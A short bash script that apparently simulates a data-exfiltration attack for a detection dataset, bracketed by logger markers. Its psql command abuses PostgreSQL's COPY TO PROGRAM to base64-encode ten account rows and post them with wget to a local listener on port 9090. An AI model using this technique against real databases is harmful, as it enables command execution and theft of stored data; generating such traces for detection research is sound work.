#!/bin/bash
echo "Simulating Data Exfiltration Attack (base64 + wget)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_base64_wget" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'base64 > /tmp/exfil_base64_wget.dat && wget -q --post-file=/tmp/exfil_base64_wget.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_base64_wget" end
